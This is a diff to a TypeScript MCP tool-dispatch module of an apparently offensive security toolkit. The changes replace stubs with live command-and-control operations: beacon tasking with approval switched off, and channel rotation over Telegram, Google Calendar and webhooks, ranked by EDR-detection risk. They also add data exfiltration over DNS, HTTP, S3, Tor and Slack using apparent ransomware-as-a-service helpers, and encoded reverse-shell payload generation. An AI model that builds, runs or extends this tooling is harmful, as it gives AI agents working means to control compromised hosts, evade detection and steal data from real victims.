@@ -1,10 +1,105 @@
 /**
  * MCP tool dispatch — all handlers delegate to real module functions (no stub findings).
  */
+import * as fs from "node:fs"
+import * as os from "node:os"
+import * as path from "node:path"
 import * as security from "./index.ts"
 import { resolveDryRun, moduleEnvelope, dryRunSkipped } from "./module_helpers.ts"
+import {
+  LegitC2Server,
+  InMemoryTransport,
+  HttpServiceTransport,
+  TelegramTransport,
+  GoogleCalendarTransport,
+} from "./c2_platform.ts"
+import { applyChannelRotation } from "./c2_rotation.ts"
 
 type LiveOpts = { live?: boolean; dryRun?: boolean }
+
+let mcpC2Server: LegitC2Server | undefined
+
+function getMcpC2Server(): LegitC2Server {
+  if (!mcpC2Server) {
+    mcpC2Server = new LegitC2Server({
+      checkpointPath: path.join(process.cwd(), ".ourmine", "c2", "mcp_checkpoint.jsonl"),
+    })
+  }
+  return mcpC2Server
+}
+
+/** Test hook — inject a LegitC2Server instance for hermetic C2 dispatch tests. */
+export function setMcpC2ServerForTest(server?: LegitC2Server): void {
+  mcpC2Server = server
+}
+
+function buildC2Channels(live: boolean): import("./c2_rotation.ts").C2ChannelOption[] {
+  const channels: import("./c2_rotation.ts").C2ChannelOption[] = [
+    { name: "in-memory", transport: new InMemoryTransport(), priority: 10, edrRisk: "low" },
+  ]
+  const httpUrl = process.env.OURMINE_C2_HTTP_URL ?? process.env.C2_WEBHOOK_URL ?? ""
+  if (httpUrl) {
+    channels.push({
+      name: "http",
+      transport: new HttpServiceTransport({ url: httpUrl, live }),
+      priority: 7,
+      edrRisk: "medium",
+    })
+  }
+  const tgToken = process.env.OURMINE_C2_TELEGRAM_TOKEN ?? process.env.TELEGRAM_BOT_TOKEN ?? ""
+  const tgChat = process.env.OURMINE_C2_TELEGRAM_CHAT ?? process.env.TELEGRAM_CHAT_ID ?? ""
+  if (tgToken && tgChat) {
+    channels.push({
+      name: "telegram",
+      transport: new TelegramTransport({ botToken: tgToken, chatId: tgChat, live }),
+      priority: 8,
+      edrRisk: "low",
+    })
+  }
+  const gcalToken = process.env.OURMINE_C2_GCAL_TOKEN ?? ""
+  if (gcalToken) {
+    channels.push({
+      name: "graph",
+      transport: new GoogleCalendarTransport({ token: gcalToken, live }),
+      priority: 6,
+      edrRisk: "low",
+    })
+  }
+  return channels
+}
+
+function resolveTransport(channel: string, live: boolean, endpoint?: string): import("./c2_platform.ts").ServiceTransport {
+  switch (channel) {
+    case "telegram":
+      return new TelegramTransport({
+        botToken: process.env.OURMINE_C2_TELEGRAM_TOKEN ?? process.env.TELEGRAM_BOT_TOKEN ?? "",
+        chatId: process.env.OURMINE_C2_TELEGRAM_CHAT ?? process.env.TELEGRAM_CHAT_ID ?? "",
+        live,
+      })
+    case "graph":
+      return new GoogleCalendarTransport({
+        token: process.env.OURMINE_C2_GCAL_TOKEN ?? "",
+        calendarId: process.env.OURMINE_C2_GCAL_ID ?? "primary",
+        live,
+      })
+    case "http":
+    case "https":
+    default:
+      return new HttpServiceTransport({
+        url: endpoint ?? process.env.OURMINE_C2_HTTP_URL ?? process.env.C2_WEBHOOK_URL ?? "",
+        live,
+      })
+  }
+}
+
+function resolveExfilPayload(data: string): { filePath: string; cleanup: boolean; bytes: number } {
+  if (fs.existsSync(data) && fs.statSync(data).isFile()) {
+    return { filePath: data, cleanup: false, bytes: fs.statSync(data).size }
+  }
+  const tmp = path.join(os.tmpdir(), `ourmine_exfil_${Date.now()}.bin`)
+  fs.writeFileSync(tmp, data, "utf8")
+  return { filePath: tmp, cleanup: true, bytes: Buffer.byteLength(data, "utf8") }
+}
 
 export async function adExploitExecute(
   req: { domain: string; technique: string; target?: string },
@@ -30,20 +125,87 @@ export async function adExploitExecute(
 }
 
 export async function c2Execute(
-  req: { action: string; channel?: string; payload?: string },
+  req: { action: string; channel?: string; payload?: string; beaconId?: string },
   opts: LiveOpts = {},
 ) {
   const dryRun = resolveDryRun(opts)
-  const op = new security.c2.Operator({ live: !dryRun })
-  const agents = op.getAgents()
-  return moduleEnvelope(dryRun, {
-    action: req.action,
-    channel: req.channel ?? "https",
-    beacons: agents.length,
-    status: agents.length ? "active" : "no_active_beacons",
-    agents,
-    payload: req.payload ?? "",
-  })
+  const live = !dryRun
+  const server = getMcpC2Server()
+  const action = req.action
+
+  if (action === "status") {
+    return moduleEnvelope(dryRun, {
+      action,
+      status: server.status(),
+      probe: server.probe(),
+    })
+  }
+
+  if (action === "list_beacons") {
+    const beacons = server.sessionsList()
+    return moduleEnvelope(dryRun, {
+      action,
+      beacons: beacons.length,
+      status: beacons.length ? "active" : "no_active_beacons",
+      agents: beacons,
+    })
+  }
+
+  if (action === "send_task") {
+    const payload = req.payload ?? ""
+    let beaconId = req.beaconId
+    let command = payload
+    const colon = payload.indexOf(":")
+    if (!beaconId && colon > 0) {
+      beaconId = payload.slice(0, colon)
+      command = payload.slice(colon + 1)
+    }
+    if (!beaconId) {
+      const active = server.sessionsList().find((s) => s.status === "active")
+      beaconId = active?.beacon_id
+    }
+    if (!beaconId) {
+      return moduleEnvelope(dryRun, { action, error: "no active beacon — register beacon first" })
+    }
+    const queued = server.queueTask(beaconId, command, { requireApproval: false })
+    let pumpResult: Record<string, unknown> | undefined
+    if (live) {
+      pumpResult = await server.pump()
+    }
+    return moduleEnvelope(dryRun, { action, beaconId, command, queued, pump: pumpResult })
+  }
+
+  if (action === "rotate_proxy") {
+    const channels = buildC2Channels(live)
+    const active = server.sessionsList().find((s) => s.status === "active")
+    if (!active) {
+      return moduleEnvelope(dryRun, { action, error: "no active beacon for channel rotation" })
+    }
+    const rotation = await applyChannelRotation(server, active.beacon_id, channels, { live })
+    const selected = channels.find((c) => c.name === rotation.selectedChannel)
+    if (selected && live) {
+      server.attachTransport(active.beacon_id, selected.transport)
+    }
+    return moduleEnvelope(dryRun, { action, rotation, channel: rotation.selectedChannel })
+  }
+
+  if (action === "setup_channel") {
+    const channel = req.channel ?? "https"
+    const transport = resolveTransport(channel, live, req.payload)
+    const active = server.sessionsList().find((s) => s.status === "active")
+    if (active) {
+      server.attachTransport(active.beacon_id, transport)
+    }
+    return moduleEnvelope(dryRun, {
+      action,
+      channel,
+      transport: transport.name,
+      probe: transport.probe(),
+      attachedBeacon: active?.beacon_id,
+    })
+  }
+
+  return moduleEnvelope(dryRun, { error: `Unknown C2 action: ${action}` })
 }
 
 export async function strixExecute(
@@ -139,10 +301,62 @@ export async function exfiltrate(
   opts: LiveOpts = {},
 ) {
   const dryRun = resolveDryRun(opts)
-  if ((req.channel ?? "dns") === "dns") {
-    return security.exfil.exfiltrateDNS(req.data, { live: !dryRun, domain: req.endpoint || "exfil.lab.local" })
+  const live = !dryRun
+  const channel = req.channel ?? "dns"
+
+  if (channel === "dns") {
+    return security.exfil.exfiltrateDNS(req.data, { live, domain: req.endpoint || "exfil.lab.local" })
   }
-  return moduleEnvelope(dryRun, { channel: req.channel, bytes: req.data.length, endpoint: req.endpoint })
+
+  if (channel === "http") {
+    const result = await security.exfil.exfiltrateHTTP(req.data, {
+      live,
+      url: req.endpoint,
+    })
+    return moduleEnvelope(dryRun, { channel, ...result })
+  }
+
+  const { filePath, cleanup, bytes } = resolveExfilPayload(req.data)
+  try {
+    if (channel === "s3") {
+      const result = await security.raas_advanced.uploadToS3(filePath, { live, forceLive: live })
+      return moduleEnvelope(dryRun, { channel, bytes, ...result })
+    }
+
+    if (channel === "tor") {
+      const result = await security.raas_advanced.uploadViaTor(filePath, {
+        live,
+        forceLive: live,
+        uploadUrl: req.endpoint,
+      })
+      return moduleEnvelope(dryRun, { channel, bytes, ...result })
+    }
+
+    if (channel === "slack") {
+      const webhook = req.endpoint ?? process.env.SLACK_WEBHOOK_URL ?? process.env.OURMINE_SLACK_WEBHOOK ?? ""
+      const result = await security.exfil_channels.sendSlackWebhook(req.data, webhook, live)
+      return moduleEnvelope(dryRun, { channel, bytes, ...result })
+    }
+
+    if (channel === "icmp") {
+      return moduleEnvelope(dryRun, {
+        channel,
+        bytes,
+        error: "ICMP exfil requires raw socket privileges — use DNS or HTTP channel",
+      })
+    }
+
+    return moduleEnvelope(dryRun, {
+      channel,
+      bytes,
+      endpoint: req.endpoint,
+      error: `Unsupported exfil channel: ${channel}`,
+    })
+  } finally {
+    if (cleanup) {
+      try { fs.unlinkSync(filePath) } catch { /* ignore */ }
+    }
+  }
 }
 
 export async function pivotTunnelExecute(
@@ -175,8 +389,16 @@ export async function toolkitGeneratePayload(
   opts: LiveOpts = {},
 ) {
   const dryRun = resolveDryRun(opts)
-  const payloads = security.multi_lang.generateAllPayloads(req.lhost ?? "127.0.0.1", req.lport ?? 4444, "linux")
-  return moduleEnvelope(dryRun, { type: req.type, language: req.language, payloads })
+  const { PayloadGenerator } = await import("./toolkit.ts")
+  const gen = new PayloadGenerator(req.lhost ?? "127.0.0.1", req.lport ?? 4444)
+  const type = req.type as import("./toolkit.ts").PayloadType
+  const language = (req.language ?? "bash") as import("./toolkit.ts").PayloadLanguage
+  const payload = gen.generate(type, language)
+  const encoded =
+    req.encode && req.encode !== "none"
+      ? gen.encode(payload, req.encode as "base64" | "hex" | "url")
+      : undefined
+  return moduleEnvelope(dryRun, { type, language, payload, encoded })
 }
 
 export async function malwareDevExecute(
@@ -223,7 +445,13 @@ export async function firmwareAnalyze(
   opts: LiveOpts = {},
 ) {
   const dryRun = resolveDryRun(opts)
-  return moduleEnvelope(dryRun, { path: req.path, action: req.action ?? "extract" })
+  const { executeFirmwareAction } = await import("./firmware.ts")
+  const action = req.action ?? "extract"
+  const result = executeFirmwareAction(req.path ?? "", action, { live: !dryRun })
+  if (result.error) {
+    return moduleEnvelope(dryRun, { path: req.path, action, ...result })
+  }
+  return moduleEnvelope(dryRun, { path: req.path, ...result })
 }
 
 export async function calderaTtpExecute(
